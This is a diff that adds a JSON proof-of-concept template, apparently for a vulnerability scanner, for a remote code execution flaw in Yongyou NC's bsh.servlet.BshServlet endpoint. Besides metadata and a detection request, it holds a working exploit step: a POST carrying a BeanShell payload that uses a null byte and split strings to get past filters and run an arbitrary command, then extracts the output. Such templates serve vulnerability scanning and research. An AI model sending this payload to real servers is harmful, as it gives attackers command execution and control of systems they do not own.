@@ -1,0 +1,101 @@
+{
+  "Name": "Yongyou NC bsh.servlet.BshServlet RCE",
+  "Description": "A command execution vulnerability exists in Yongyou NC, which can be exploited by attackers to obtain server privileges.",
+  "Product": "yongyou-ism",
+  "Homepage": "https://www.yonyou.com/",
+  "DisclosureDate": "2021-05-24",
+  "Author": "李大壮",
+  "GobyQuery": "product=\"yongyou-ism\"",
+  "Level": "3",
+  "Impact": "<p>Attackers can perform remote code execution on affected versions of Yongyou NC via carefully constructed request packets.<br></p>",
+  "Recommandation": "<p>1.&nbsp;Intercept access to the bsh.servlet.BshServlet directory</p><p>2.&nbsp;Update Patches</p>",
+  "References": [
+    "https://blog.csdn.net/qq_41770175/article/details/102821349"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "POST",
+        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data_type": "text",
+        "data": "bsh.script=import+org.apache.commons.codec.digest.DigestUtils%3B%0D%0Aprint%28DigestUtils.md5Hex%28%22Weaver%22%29%29%3B%0D%0A%0D"
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "410f8051a15a4c16e5cdfccb9dbf547b",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "bsh.script=eval%00(\"ex\"%2b\"ec(\\\"{{{cmd}}}\\\")\");",
+        "data_type": "text",
+        "follow_redirect": false,
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "method": "POST",
+        "uri": "/servlet/~ic/bsh.servlet.BshServlet"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      },
+      "SetVariable": [
+        "output|lastbody|regex|(?s)<pre>(.*?)</pre>"
+      ]
+    }
+  ],
+  "Tags": [
+    "RCE"
+  ],
+  "CVEIDs": null,
+  "CVSSScore": "0.0",
+  "AttackSurfaces": {
+    "Application": [
+      "yongyou-ism"
+    ],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
